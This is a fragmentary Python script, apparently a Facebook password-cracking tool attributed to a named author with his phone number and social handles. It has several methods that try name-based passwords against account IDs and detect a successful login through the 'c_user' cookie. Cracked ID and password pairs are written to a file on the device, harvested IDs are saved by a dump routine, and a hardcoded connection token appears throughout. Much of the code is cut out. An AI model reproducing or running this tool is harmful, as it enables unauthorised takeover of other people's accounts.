#!/usr/bin/python
#DX_Ajmir_Hossain My wp  01813225678
...
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            Ajmir Hossain 
\033[1;37m Facebook:            DX Ajmir Hossain
\033[1;37m Github  :            DX-AJMIR-HOSSAIN
...
def sarfraz():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://m.me/j/AbaMNBT8svyC-MhN//')
        pass
    elif select =='F':
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[DX] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[DX] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[DX] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [DX-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/DX_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
...
def p_dump():
    ...
    try:
        ...
        print(f"File Saved To  {filepath} ")
        print(47*'-')
        input("Press enter to back DX Menu ")
        SSB(allkey)
    except Exception as e:
        print("Error : %s"%e) 
...
def cutter():
    ...
    print(47*'-')
    input(f"{S} Press Enter To Back DX Menu ")
    SSB(allkey)       
